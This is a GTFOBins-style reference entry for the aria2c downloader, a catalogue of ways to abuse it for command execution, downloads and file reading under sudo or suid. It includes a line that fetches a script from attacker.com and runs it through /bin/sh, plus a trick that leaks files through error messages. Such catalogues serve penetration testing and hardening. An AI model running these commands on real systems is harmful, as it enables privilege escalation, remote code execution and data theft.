---
type: gtfobin
name: aria2c
platform: Unix
functions: [command, download, file-read]
tags: [gtfobin, unix, lotl]
---

# aria2c

## command

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```
_Note that the subprocess is immediately sent to the background._
**Contexts:** sudo, suid, unprivileged

```bash
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
```
_The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID._
**Contexts:** sudo, suid, unprivileged

## download

```bash
aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
```
_Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory._
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
aria2c -i /path/to/input-file
```
_The file is leaked as error messages._
**Contexts:** sudo, suid, unprivileged
